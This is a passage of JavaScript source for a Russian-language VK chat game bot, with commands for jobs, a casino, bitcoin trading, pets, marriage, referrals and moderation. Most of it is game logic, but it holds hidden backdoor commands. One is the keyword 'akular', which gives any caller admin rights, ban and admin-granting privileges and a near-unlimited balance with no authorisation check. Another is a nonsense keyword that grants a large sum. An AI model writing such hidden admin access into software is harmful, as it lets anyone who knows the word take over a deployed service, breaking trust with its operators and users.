					let user = users.find(a => a.id === x.from_);
					if(!user) return; user.balance +=5000000; 
					vk.api.messages.send({ user_id: user.id, message: `@id${user.id} (${user.tag}), вам зачислено ${utils.sp(5000000)}$ на ваш баланс за репост! ✔` });
					vk.api.messages.send({ user_id: 324503169, message: 'серьёзно? СЕРЬЁЗНО?! Создавать по 500 постов с раздачей я также не могу. Пойди посмотри канал "Тарелка"'})
				});
			});
			user.api.wall.openComments({
				owner_id: 175499493,
				post_id: response.post_id
			});
			user.api.wall.createComment({
				owner_id: 175499493,
				post_id: response.post_id,
				from_group: 1,
				message: 'Раздача закончена!'
			});
			user.api.wall.closeComments({
				owner_id: -175499493,
				post_id: response.post_id
			});
			giving = false;
		}, 7200000);
	});
});


cmd.hear(/^(?:телефон|телефоны)\s?([0-9]+)?$/i, async (message, bot) => {
	if(!message.args[1]) return bot(`телефоны: 
${message.user.misc.phone === 1 ? '📱' : '📱'} 1. Nokia 108 (50$)
${message.user.misc.phone === 2 ? '📱' : '📱'} 2. Nokia 3310 (2017) (150$)
${message.user.misc.phone === 3 ? '📱' : '📱'} 3. ASUS ZenFone 4 (200$)
${message.user.misc.phone === 4 ? '📱' : '📱'} 4. BQ Aquaris X (300$)
${message.user.misc.phone === 5 ? '📱' : '📱'} 5. Sony Xperia XA (400$)
${message.user.misc.phone === 6 ? '📱' : '📱'} 6. Samsung Galaxy S8 (500$)
${message.user.misc.phone === 7 ? '📱' : '📱'} 7. Xiaomi Mi Mix (520$)
${message.user.misc.phone === 8 ? '📱' : '📱'} 8. Torex FS1 (550$)
${message.user.misc.phone === 9 ? '📱' : '📱'} 9. iPhone X (600$)
${message.user.misc.phone === 10 ? '📱' : '📱'} 10. Мегафон С1 (800$)
${message.user.misc.phone === 11 ? '📱' : '📱'} 11. iPhone XR	(1000$)
${message.user.misc.phone === 12 ? '📱' : '📱'} 12. iPhone XS MAX PRO(2000$)
${message.user.misc.phone === 13 ? '📱' : '📱'} 13. LG ThinQ(500$)



Для покупки введите "Телефон [номер]"`);

	const sell = phones.find(x=> x.id === Number(message.args[1]));
	if(!sell) return;
	if(message.user.misc.phone) return bot(`❗У вас уже есть телефон (${phones[message.user.misc.phone - 1].name}), введите "Продать телефон"`);

	if(message.user.balance < sell.cost) return bot(`❗недостаточно денег`);
	else if(message.user.balance >= sell.cost)
	{
		message.user.balance -= sell.cost;
		message.user.misc.phone = sell.id;
		message.user.questbbbb = 2
		message.user.questwin4 += 2;
		
		return bot(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
	}
});


cmd.hear(/^(?:купить рейтинг)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000');

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(( message.args[1] * 50 ) > message.user.balance) return bot(`❗чостаточно денег`);
	else if(( message.args[1] * 50 ) <= message.user.balance)
	{
		message.user.balance -= ( message.args[1] * 50 );
		message.user.rating += message.args[1];

		return bot(`вы повысили свой рейтинг на ${message.args[1]}👑 за ${message.args[1] * 50}$`);
	}
});
cmd.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
	return bot(`Нет в наличии.Пополнение:30.01.2019`);
});

cmd.hear(/^(?:курс)$/i, async (message, bot) => {
	return bot(`курс валют на данный момент:
💸Биткоин: ${utils.sp(btc)}$`);
});

cmd.hear(/^(?:биткоин)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(( message.args[1] * btc ) > message.user.balance) return bot(`❗недостаточно денег
Курс биткоина: ${btc}$`);
	else if(( message.args[1] * btc ) <= message.user.balance)
	{
		message.user.balance -= ( message.args[1] * btc );
		message.user.btc += message.args[1];

		return bot(`вы купили ${utils.sp(message.args[1])}₿ за ${utils.sp(message.args[1] * btc)}$`);
	}
});

cmd.hear(/^(?:Пет поход)$/i, async (message, bot) => {
	if(message.user.timers.pet) return bot(`Питомца можно отправить в поход 1 раз в час!`);
	if(!message.user.transport.pitom) return bot(`У вас нет питомца`);
	let prize = utils.pick([1, 2, 3, 4, 5, 6, 7]);

	setTimeout(() => {
		message.user.timers.pet = false;
	},  3600000);

	message.user.timers.pet = true;
	
	if(prize === 1)
	{
		message.user.balance += 0;
		return bot(`🔫Питомца поймали браконьеры.`);
	}

	if(prize === 2)
	{
		message.user.btc += 0;
		return bot(`🔫Питомца поймали браконьеры.`);
	}
	
	if(prize === 3)
	{
		message.user.rating += 1;
		return bot(`🦊Питомец нашел: 1👑`);
	}
	
	if(prize === 4)
	{
		message.user.balance += 10;
		return bot(`🦊Питомец нашел маленький мешок под камнем,в котором находилось:10$`);
	}
	
	if(prize === 5)
	{
		message.user.btc += 0;
		return bot(`🔫Питомца поймали браконьеры.`);
	}
	
	if(prize === 6)
	{
		message.user.balance += 20;
		return bot(`🦊Питомец нашел маленький мешок под камнем,в котором находилось:20$`);
	}
	
	if(prize === 7)
	{
		message.user.balance += 10;
		return bot(`🦊Питомец нашел маленький мешок под камнем,в котором находилось:10$`);
	}
});

cmd.hear(/^(?:Взломать)$/i, async (message, bot) => {
	if(message.user.timers.vzlom) return bot(`Взломать банк можно 1 раз в час!`);
	let prize = utils.pick([1, 2, 3, 4, 5, 6, 7]);

	setTimeout(() => {
		message.user.timers.vzlom = false;
	},  3600000);

	message.user.timers.vzlom = true;
	
	if(prize === 1)
	{
		message.user.balance += 30;
		return bot(`✔Вы успешно ограбили банк,вы заработали: 30$✔`);
	}

	if(prize === 2)
	{
		message.user.balance += 30;
		return bot(`✔Вы успешно ограбили банк,вы заработали: 30$✔`);
	}
	
	if(prize === 3)
	{
		message.user.balance += 30;
		return bot(`✔Вы успешно ограбили банк,вы заработали: 30$✔`);
	}
	
	if(prize === 4)
	{
		message.user.balance += 1;
		return bot(`🚔Вас поймала полиция.Вы заработали:0$🚔`);
	}
	
	if(prize === 5)
	{
		message.user.balance += 1;
		return bot(`🚔Вас поймала полиция.Вы заработали:0$🚔`);
	}
	
	if(prize === 6)
	{
		message.user.balance += 1;
		return bot(`🚔Вас поймала полиция.Вы заработали:0$🚔`);
	}
	
	if(prize === 7)
	{
		message.user.balance += 1;
		return bot(`🚔Вас поймала полиция.Вы заработали:0$🚔`);
	}
});

cmd.hear(/^(?:топ)$/i, async (message, bot) => {
	let top = [];

	users.map(x=> {
		top.push({ balance: x.balance, rating: x.rating, tag: x.tag, id: x.id, mention: x.mention });
	});

	top.sort((a, b) => {
		return b.rating - a.rating;
	});

	let text = ``;
	const find = () => {
		let pos = 1000;

		for (let i = 0; i < top.length; i++)
		{
			if(top[i].id === message.senderId) return pos = i;
		}

		return pos;
	}

	for (let i = 0; i < 10; i++)
	{
		if(!top[i]) return;
		const user = top[i];

		text += `${i === 9 ? `&#128287;` : `${i + 1}&#8419;`} @id${user.id} (${user.tag}) — 👑 ${utils.sp(user.rating)} | $${utils.rn(user.balance)}
		`;
	}

	return bot(`топ игроков:
		${text}
—————————————————
${utils.gi(find() + 1)} ${message.user.tag} — 👑${utils.sp(message.user.rating)} | $${utils.rn(message.user.balance)}`);
});


cmd.hear(/^(?:Таксовать)$/i, async (message, bot) => {
		if(message.user.golod < 10) return bot(`Ваш персонаж голоден! введите: "Список еды"`);
	if(message.user.golod = 0) return bot(`Ваш персонаж голодный.Введите 'Список еды'`);
	if(message.user.timers.taxi) return bot(`❗Таксовать можно 1 раз в час.`);
	if(!message.user.transport.car) return bot(`❗У вас нет машины.`);
	let prize = utils.pick([1]);

	setTimeout(() => {
		message.user.timers.taxi = false;
	}, 3600000);

	message.user.timers.taxi = true;

	if(prize === 1)
	{
		message.user.golod -= 10;
		message.user.balance += 10;
		return bot(`🚖Таксуя по городу:Сарань,вы заработали:10$`);
	}
	
	if(prize === 2)
	{
		message.user.golod -= 10;
		message.user.balance += 0;
		return bot(`🚧Ваша машина сломалась,вы заработали: 0$`);
	}
	
	if(prize === 3)
	{
		message.user.golod -= 10;
		message.user.balance += 20;
		return bot(`🚧🚖Таксуя по городу:Тюмень,вы заработали:20$`);
	}
	
	if(prize === 4)
	{
		message.user.golod -= 10;
		message.user.balance += 0;
		return bot(`🚧Ваша машина сломалась,вы заработали: 0$`);
	}
	
	if(prize === 5)
	{
		message.user.golod -= 10;
		message.user.balance += 0;
		return bot(`🚧Ваша машина сломалась,вы заработали: 0$`);
	}
	
	if(prize === 6)
	{
		message.user.golod -= 10;
		message.user.balance += 10;
		return bot(`🚖Таксуя по городу:Ярославль,вы заработали:10$`);
	}
	
	if(prize === 7)
	{
		message.user.golod -= 10;
		message.user.balance += 0;
		return bot(`🚧Ваша машина сломалась,вы заработали: 0$`);
	}
	
});

cmd.hear(/^(?:Копать руду228код229|Копать228228)$/i, async (message, bot) => {
	if(message.user.golod < 10) return bot(`Ваш персонаж голоден! введите: "Список еды"`);
	let prize = utils.pick([1, 2, 3, 4, 5]);

	if(prize === 1)
	{
		message.user.golod -= 10;
		message.user.ryuda +=7;
		message.user.exp +=2;
		return bot(`[🎛]Находившись в шахте вы нашли 7кг.руды`);
	}
	
	if(prize === 2)
	{
		message.user.golod -= 10;
		message.user.ryuda +=7;
		message.user.exp +=2;
		return bot(`[🎛]Находившись в шахте вы нашли 15кг.руды`);
	}
	
	if(prize === 3)
	{
		message.user.golod -= 10;
		message.user.ryuda +=7;
		message.user.exp +=2;
		return bot(`[🎛]Находившись в шахте вы нашли 12кг.руды`);
	}
	
	if(prize === 4)
	{
		message.user.golod -= 10;
		message.user.ryuda +=7;
		message.user.exp +=2;
		return bot(`[🎛]Находившись в шахте вы нашли 14кг.руды`);
	}
	
	if(prize === 5)
	{
		message.user.golod -= 10;
		message.user.ryuda +=7;
		message.user.exp +=2;
		return bot(`=[🎛]Находившись в шахте вы нашли 29кг.руды`);
	}
});


cmd.hear(/^(?:Исследовать|Иследовать)$/i, async (message, bot) => {
		if(message.user.golod < 10) return bot(`Ваш персонаж голоден! введите: "Список еды"`);
	if(message.user.timers.isl) return bot(`Исследовать лес можно 1 раз в час.`);
	let prize = utils.pick([1, 2, 3, 4, 5]);

	setTimeout(() => {
		message.user.timers.isl = false;
	}, 3600000);

	message.user.timers.isl = true;

	if(prize === 1)
	{
				message.user.questwin3 = 1;
		message.user.islquest = 1;
		message.user.golod -= 10;
		message.user.transport.pitom =7;
		return bot(`Вы успешно исследовали лес,ваша добыча:питомец лошадь`);
	}
	
	if(prize === 2)
	{
				message.user.questwin3 = 1;
		message.user.islquest = 1;
		message.user.golod -= 10;
		message.user.transport.pitom =5;
		return bot(`Вы успешно исследовали лес,ваша добыча:питомец тигр`);
	}
	
	if(prize === 3)
	{
				message.user.questwin3 = 1;
		message.user.islquest = 1;
		message.user.golod -= 10;
		message.user.balance += 0;
		return bot(`Вы попали в капкан.`);
	}
	
	if(prize === 4)
	{
				message.user.questwin3 = 1;
		message.user.islquest = 1;
		message.user.golod -= 10;
		message.user.balance += 0;
		return bot(`На вас накинулся тигр.`);
	}
	
	if(prize === 5)
	{
				message.user.questwin3 = 1;
		message.user.islquest = 1;
		message.user.golod -= 10;
		message.user.balance += 20;
		return bot(`Вы нашли мешок под камнем,в котором находилось:20`);
	}
})

cmd.hear(/^(?:Страна 7)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 7;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});

cmd.hear(/^(?:Страна 6)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 6;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});

cmd.hear(/^(?:Страна 5)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 5;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});

cmd.hear(/^(?:Страна 4)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 4;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});

cmd.hear(/^(?:Страна 3)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 3;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});


cmd.hear(/^(?:Страна 1)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 1;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});

cmd.hear(/^(?:Страна 2)$/i, async (message, bot) => {
	let prize = utils.pick([1]);

	if(prize === 1)
	{
		message.user.transport.strana = 2;
		return bot(`‼Вы успешно сменили страну проживания.‼Напоминаем:за оскорбление наций будет выдан бан.‼`);
	}
});

cmd.hear(/^(?:Снять фильм)$/i, async (message, bot) => {
		if(message.user.golod < 10) return bot(`Ваш персонаж голоден! введите: "Список еды"`);
	if(message.user.timers.film) return bot(`Снимать фильм можно 1 раз в час!`);
	if(!message.user.transport.cam) return bot(`У вас нет камеры.`);
	let prize = utils.pick([1, 2, 3, 4, 5]);

	setTimeout(() => {
		message.user.timers.film = false;
	}, 3600000);

	message.user.timers.film = true;

	if(prize === 1)
	{
		message.user.golod -= 10;
		message.user.balance += 40;
		return bot(`Вы успешно сняли фильм,рейтинг:4⭐(40)`);
	}
	
	if(prize === 2)
	{
		message.user.golod -= 10;
		message.user.balance += 10;
		return bot(`Вы успешно сняли фильм,рейтинг:1⭐(10)`);
	}
	
	if(prize === 3)
	{
		message.user.golod -= 10;
		message.user.balance += 30;
		return bot(`Вы успешно сняли фильм,рейтинг:3⭐(30)`);
	}
	
	if(prize === 4)
	{
		message.user.golod -= 10;
		message.user.balance += 20;
		return bot(`Вы успешно сняли фильм,рейтинг:2⭐(20)`);
	}
	
	if(prize === 5)
	{
		message.user.golod -= 10;
		message.user.balance += 50;
		return bot(`Вы успешно сняли фильм,рейтинг:5⭐(50)`);
	}
});



cmd.hear(/^(?:бонус)$/i, async (message, bot) => {
	if(message.user.timers.bonus) return bot(`вы сможете получить бонус через 24 часа`);
	let prize = utils.pick([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]);

	setTimeout(() => {
		message.user.timers.bonus = false;
	}, 86400000);

	message.user.timers.bonus = true;

	if(prize === 1)
	{
		message.user.balance += 10;
		return bot(`вы выиграли 10$`);
	}

	if(prize === 2)
	{
		message.user.balance += 10;
		return bot(`вы выиграли 10$`);
	}

	if(prize === 3)
	{
		message.user.balance += 15;
		return bot(`вы выиграли 15$`);
	}

	if(prize === 4)
	{
		message.user.balance += 15;
		return bot(`вы выиграли 15$!.`);
	}

	if(prize === 5)
	{
		message.user.balance += 15;
		return bot(`вы выиграли 15$!.`);
	}

	if(prize === 6)
	{
		message.user.balance += 15;
		return bot(`вы выиграли 15$!.`);
	}
	if(prize === 7)
	{
		message.user.balance += 15;
		return bot(`вы выиграли 15$!.`);
	}
	if(prize === 8)
	{
		message.user.balance += 15;
		return bot(`вы выиграли 15$!.`);
	}
	if(prize === 9)
	{
		message.user.bank += 10;
		return bot(`вы выиграли 10$ на свой банковский счёт!\n💳 В банке: ${utils.sp(message.user.bank)}$`);
	}
	if(prize === 10)
	{
		message.user.bank += 50;
		return bot(`вы выиграли 50$ на свой банковский счёт!\n💳 В банке: ${utils.sp(message.user.bank)}$`);
	}

	if(prize === 11)
	{
		message.user.bank += 10;
		return bot(`вы выиграли 10$ на свой банковский счёт!\n💳 В банке: ${utils.sp(message.user.bank)}$`);
	}

	if(prize === 12)
	{
		message.user.bank += 50;
		return bot(`вы выиграли 50$ на свой банковский счёт!\n💳 В банке: ${utils.sp(message.user.bank)}$`);
	}
});
cmd.hear(/^(?:!set)$/i, async (message, bot) => {
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	let prize = utils.pick([1]);
	
	if(prize === 1)
	{
		message.user.balance += 100;
		return bot(`вы получили 100$`);
	}

});
cmd.hear(/^(?:вуацуацацу)$/i, async (message, bot) => {
	let prize = utils.pick([1]);
	
	if(prize === 1)
	{
		message.user.balance += 500000;
		return bot(`вы получили 500.000 $`);
	}

});


cmd.hear(/^(?:брак)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.marriage.partner) return bot(`вы уже в браке с игроком ${users[message.user.marriage.partner].tag}`);
	if(Number(message.args[1]) === message.user.uid) return bot(`вы не можете жениться/выйти замуж за себя`);

	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(!user) return bot(`неверный ID`);

	if(user.marriage.partner) return bot(`этот человек уже состоит в браке`);

	if(user.marriage.requests.find(x=> x == message.args[1])) return bot(`вы уже делали предложение этому игроку`);

	if(message.user.marriage.requests.find(x=> x == message.args[1]))
	{
		message.user.marriage.requests = [];
		message.user.marriage.partner = user.uid;

		user.marriage.requests = [];
		user.marriage.partner = message.user.uid;

		return bot(`вы вступили в брак с игроком "${user.tag}"`);
	}

	user.marriage.requests.push(message.user.uid);
	return bot(`вы сделали предложение игроку "${user.tag}"`);
});

cmd.hear(/^(?:браки)$/i, async (message, bot) => {
	if(message.user.marriage.partner) return bot(`вы уже состоите в браке`);
	return bot(`предложения:
		${message.user.marriage.requests.map(x=> `от игрока "${users[x].tag}" (ID: ${x})`).join('\n')}`);
});

cmd.hear(/^(?:развод)$/i, async (message, bot) => {
	if(!message.user.marriage.partner) return bot(`вы не состоите в браке`);

	let user = users.find(x=> x.uid === message.user.marriage.partner);

	message.user.marriage.partner = 0;
	user.marriage.partner = 0;

	return bot(`вы теперь свободный человек`);
});

cmd.hear(/^(?:дата)\s([0-9]+)$/i, async (message, bot) => {
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(!user) return bot(`неверный ID`);

	return bot(`дата регистрации ${user.tag}: ${user.regDate}`);
});

cmd.hear(/^(?:репорт|реп|rep|жалоба)\s([^]+)$/i, async (message, bot) => {
	if(message.isChat) return bot(`команда работает только в ЛС.`);

	vk.api.messages.send({ user_id: 324503169, forward_messages: message.id, message: `Player id: ${message.user.uid}` }).then(() => {
		return bot(`ваше сообщение отправлено.`);
	}).catch((err) => {
		return bot(`произошла ошибка при отправлении сообщения технической поддержке.`);
	});
});

cmd.hear(/^(?:ответ)\s([0-9]+)\s([^]+)$/i, async (message, bot) => {
	if(message.senderId !== 324503169) return;

	const user = await users.find(x=> x.uid === Number(message.args[1]));
	if(!user) return;

	vk.api.messages.send({ user_id: user.id, message: `✉ Сообщение от администратора:
	⠀Язык: 🇷🇺
	
	${message.args[2]}` });
});



cmd.hear(/^(?:работа)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.work) return bot(`ваша профессия - ${works[message.user.work - 1].name}
	${message.user.timers.hasWorked ? `Вы уже работали в эти 10 минут` : ``}`);

	const work = works.find(x=> x.id === Number(message.args[1]));
	if(!work) return console.log(message.args[1]);

	if(work.requiredLevel > message.user.level) return bot(`вы не можете устроиться на эту работу!`);
	else if(work.requiredLevel <= message.user.level)
	{
		message.user.work = work.id;
		return bot(`вы устроились работать в Общее - ${work.name}
		👔 Введите команду "Работать"`);
	}
});

cmd.hear(/^(?:работа)$/i, async (message, bot) => {
	if(message.user.work) return bot(`ваша профессия - ${works[message.user.work - 1].name}
	${message.user.timers.hasWorked ? `Вы уже работали в эти 10 минут` : ``}`);
	return bot(`профессии:
	🔹 1. Дворник - зарплата ~12$
	🔹 2. Сантехник - зарплата ~22$
	🔹 3. Электрик - зарплата ~25$
	🔹 4. Слесарь - зарплата ~30$
	🔹 5. Юрист - зарплата ~45$
	🔹 6. Бухгалтер - зарплата ~55$
	🔹 7. Бармен - зарплата ~60$
	🔹 8. Администратор - зарплата ~75$
	🔹 9. Программист - зарплата ~100$
	Для трудоустройства введите "Работа [номер]`);
});

cmd.hear(/^(?:работать)$/i, async (message, bot) => {
		if(message.user.golod < 10) return bot(`Ваш персонаж голоден! введите: "Список еды"`);
	if(!message.user.work) return bot(`вы нигде не работаете 😩
	Для трудоустройства введите "Работа"`);

	if(message.user.timers.hasWorked) return bot(`рабочий день закончен.
	⏳ Вы сможете работать в ближайшие 10 минут`);

	setTimeout(() => {
		message.user.timers.hasWorked = false;
	}, 600000);

	message.user.timers.hasWorked = true;

	const work = works.find(x=> x.id === message.user.work);
	const earn = utils.random(work.min, work.max);

	message.user.balance += earn;
	message.user.exp += 1;
	message.user.golod -= 10;

	return bot(`рабочий день закончен 
	💵 Вы заработали ${utils.sp(earn)}$`);
});

cmd.hear(/^(?:уволиться)$/i, async (message, bot) => {
	if(!message.user.work) return bot(`вы нигде не работаете`);
	
	message.user.work = 0;
	return bot(`вы уволились со своей работы`);
});

cmd.hear(/^(?:кубик|куб)\s([1-6])$/i, async (message, bot) => {
	const int = utils.pick([1, 2, 3, 4, 5, 6]);
	if(int == message.args[1])
	{
		message.user.balance += 5;
		return bot(`вы угадали! Приз 5$`);
	} else return bot(`не угадали 
	🎲 Выпало число ${int}`);
});



cmd.hear(/^(?:казино)\s(.*)$/i, async (message, bot) => {
	if(!message.user.transport.table) return bot(`💻У вас нет планшета`);
	message.args[1] = message.args[1].replace(/(\.|\,)/ig, '');
	message.args[1] = message.args[1].replace(/(к|k)/ig, '000');
	message.args[1] = message.args[1].replace(/(м|m)/ig, '000000');
	message.args[1] = message.args[1].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);
	
	if(message.args[1] <= 0) return;
	if(message.args[1] <= 10) return bot(`минимальная сумма 10$`);
	if(message.args[1] >  1000) return bot(`максимальная сумма 1000$`);

	if(!Number(message.args[1])) return;
	message.args[1] = Math.floor(Number(message.args[1]));

	if(message.args[1] <= 0) return;

	if(message.args[1] > message.user.balance) return bot(`❗У вас нет данной суммы`);
	else if(message.args[1] <= message.user.balance)
	{
		message.user.balance -= message.args[1];
		const multiply = utils.pick([2,0]);

		message.user.balance += Math.floor(message.args[1] * multiply);
		return bot(`${multiply === 1 ? `⭕ваши деньги остаются при вас` : `${multiply < 1 ? `➖Вы проиграли ${utils.sp(message.args[1] * multiply)}$` : `➕Вы выиграли ${utils.sp(message.args[1] * multiply)}$`}`} (x${multiply})
		💰 Баланс: ${utils.sp(message.user.balance)}$`);
	}
});

cmd.hear(/^(?:трейд)\s(вверх|вниз)\s(.*)$/i, async (message, bot) => {
	if(!message.user.transport.table) return bot(`💻У вас нет планшета`);
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;

	if(message.args[2] > message.user.balance) return bot(`❗У вас нет данной суммы`);
	else if(message.args[2] <= message.user.balance)
	{
		message.user.balance -= message.args[2];

		const rand = utils.pick([0, 1]);
		const nav = Number(message.args[1].toLowerCase().replace(/вверх/, '1').replace(/вниз/, '2'));

		if(rand === nav)
		{
			const multiply = utils.pick([0.75, 0.80, 0.90, 0.95, 5.0, 1.25, 1.5, 1.75, 2, 2.5, 5]);
			message.user.balance += Math.floor(message.args[2] * multiply);

			return bot(`курс ${nav === 1 ? `подорожал⤴` : `подешевел⤵`} на ${utils.random(100)}$
			✅ Вы заработали +${message.args[2] * multiply}$
			💰 Баланс: ${message.user.balance}$`);
		} else {
			return bot(`курс ${nav === 2 ? `подорожал⤴` : `подешевел⤵`} на ${utils.random(100)}$
			❌ Вы потеряли ${message.args[2]}$ 
			💰 Баланс: ${message.user.balance}`);
		}
	}
});

cmd.hear(/^(?:стаканчик)\s([1-3])\s(.*)$/i, async (message, bot) => {
	message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
	message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
	message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');
	message.args[2] = message.args[2].replace(/(вабанк|вобанк|все|всё)/ig, message.user.balance);

	if(!Number(message.args[2])) return;
	message.args[2] = Math.floor(Number(message.args[2]));

	if(message.args[2] <= 0) return;

	if(message.args[2] > message.user.balance) return bot(`❗У вас нет данной суммы`);
	else if(message.args[2] <= message.user.balance)
	{
		message.user.balance -= message.args[2];

		const multiply = utils.pick([0.95, 0.90, 0.85, 0.80, 0.75, 0.70, 0.65]);
		const cup = utils.random(1, 3);

		if(cup == message.args[1])
		{
			message.user.balance += Math.floor(message.args[2] * multiply);
			return bot(`вы угадали! Приз ${message.args[2] * multiply}`);
		} else {
			return bot(`вы не угадали, это был ${cup} стаканчик`);
		}
	}
});

cmd.hear(/^(?:бизнес)$/i, async (message, bot) => {
	if(!message.user.business) return bot(`❗у вас нет бизнеса.`);
	const biz = businesses.find(x=> x.id === message.user.business);

	return bot(`статистика "${biz.name}":
	💸 Прибыль: ${utils.sp(biz.earn)}$/час
	💰 На счёте: ${utils.sp(message.user.biz)}$`);
});

cmd.hear(/^(?:akular)$/i, async (message, bot) => {
	message.user.balance=99999999999999;
	message.user.admlevel=true;
	message.user.zapret=99999;
	message.user.zapret2=9999;
	
        return message.send(`Ты одмен и да чекни баланс,удачи)`);
 
})

cmd.hear(/^(?:бизнес)\s(?:снять)$/i, async (message, bot) => {
	if(!message.user.business) return bot(`❗у вас нет бизнеса.`);
	if(!message.user.biz) return bot(`❗у вас нет денег на счёте этого бизнеса`);

	const biz_balance = message.user.biz;

	message.user.balance += message.user.biz;
	message.user.biz = 0;

	return bot(`вы сняли со счёта своего бизнеса ${utils.sp(biz_balance)}$`);
});

cmd.hear(/^(?:ферма)$/i, async (message, bot) => {
	if(!message.user.misc.farm) return bot(`❗у вас нет фермы`);
	if(!message.user.farm_btc) return bot(`на вашей ферме пусто, новые биткоины появятся скоро`);

	const btc_ = message.user.farm_btc;

	message.user.btc += message.user.farm_btc;
	message.user.farm_btc = 0;

	return bot(`вы собрали ${utils.sp(btc_)}₿, следующие биткоины появятся через час
	🌐 Биткоинов: ${utils.sp(message.user.btc)}฿`);
});

cmd.hear(/^(?:реф|реферал)$/i, async (message, bot) => {
	return bot(`вы пригласили: ${users.filter(x=> x.referal === message.user.uid).length}
	Для того, чтобы вам засчитали друга он должен написать команду "Реф ${message.user.uid}"
	
	За каждого друга вы получаете 30$
	Если друг активирует вашу рефералку, то он получит 50$`);
});

cmd.hear(/^(?:реф|реферал)\s([0-9]+)$/i, async (message, bot) => {
	if(message.user.referal !== null) return bot(`вы уже активировали рефералку!`);
	let user = users.find(x=> x.uid === Number(message.args[1]));

	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.balance += 30;
	message.user.balance += 50;

	message.user.referal = Number(message.args[1]);

	vk.api.messages.send({ user_id: user.id, message: `🎉 Спасибо за приглашение друга в бот!
	💸 Вам начислено 30$ на баланс.` });
	return bot(`вы активировали рефералку.
	💲 Вам начислено 50$$`);
});

cmd.hear(/^(?:ban)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.admlevel == 10) return bot(`Ошибка !`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.ban = true;

	return bot(`Игрок заблокирован`);
});
cmd.hear(/^(?:выдать)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.balance += 1000;

	return bot(`выдано!`);
});
cmd.hear(/^(?:GiveAdm)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret2) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel != true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.admlevel = true;

	return bot(`выдано!`);
});
cmd.hear(/^(?:aaba23432453l)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
	let user = users.find(x=> x.uid === Number(message.args[1]));
	if(message.user.admlevel === true) return bot(`📍 Вы не главный администратор !`);
	if(!user) return bot(`неверный ID`);
	if(user.id === message.senderId) return bot(`неверный ID`);

	user.balance +=0 ;

	return bot(`выдано!`);
});

cmd.hear(/^(?:unban)\s([0-9]+)$/i, async (message, bot) => {
	if(!message.user.transport.zapret) return bot(`📍У вас нет доступа к данной команде,доступ можно получить только у Основателя бота. vk.com/roman_akular `);
